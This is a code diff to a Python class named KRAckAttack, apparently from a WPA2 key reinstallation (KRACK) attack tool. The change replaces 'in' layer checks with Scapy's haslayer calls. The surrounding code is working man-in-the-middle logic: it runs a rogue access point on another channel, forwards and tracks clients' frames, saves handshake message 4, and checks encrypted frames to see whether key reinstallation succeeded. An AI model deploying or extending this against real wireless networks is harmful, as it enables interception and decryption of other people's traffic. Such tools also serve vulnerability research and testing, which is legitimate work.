@@ -713,7 +713,7 @@ class KRAckAttack():
 		# 2. Handle frames sent BY the real AP
 		elif p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
-			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
+			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.real_channel:
 				self.last_real_beacon = time.time()
 
 			# Decide whether we will (eventually) forward it
@@ -721,7 +721,7 @@ class KRAckAttack():
 			might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)
 
 			# Pay special attention to Deauth and Disassoc frames
-			if Dot11Deauth in p or Dot11Disas in p:
+			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
 			# If targeting a specific client, display all frames it sends
 			elif self.clientmac is not None and self.clientmac == p.addr1:
@@ -743,7 +743,7 @@ class KRAckAttack():
 					elif self.handle_to_client_groupkey(client, p):
 						pass
 
-					elif Dot11Deauth in p:
+					elif p.haslayer(Dot11Deauth):
 						del self.clients[p.addr1]
 						self.sock_rogue.send(p)
 
@@ -766,7 +766,7 @@ class KRAckAttack():
 		# 1. Handle frames sent BY the rouge AP
 		if p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
-			if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
+			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
@@ -780,7 +780,7 @@ class KRAckAttack():
 			client = None
 
 			# Check if it's a new client that we can MitM
-			if Dot11Auth in p:
+			if p.haslayer(Dot11Auth):
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].mark_got_mitm()
@@ -798,14 +798,14 @@ class KRAckAttack():
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
 				# Save the association request so we can track the encryption algorithm and options the client uses
-				if Dot11AssoReq in p: client.assocreq = p
+				if p.haslayer(Dot11AssoReq): client.assocreq = p
 				# Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
 				if get_eapol_msgnum(p) == 4: client.msg4 = p
 
 				# Client is sending on rogue channel, we got a MitM position =)
 				client.mark_got_mitm()
 
-				if Dot11WEP in p:
+				if p.haslayer(Dot11WEP):
 					# Use encrypted frames to determine if the key reinstallation attack succeeded
 					self.handle_from_client_pairwise(client, p)
 					self.handle_from_client_groupkey(client, p)
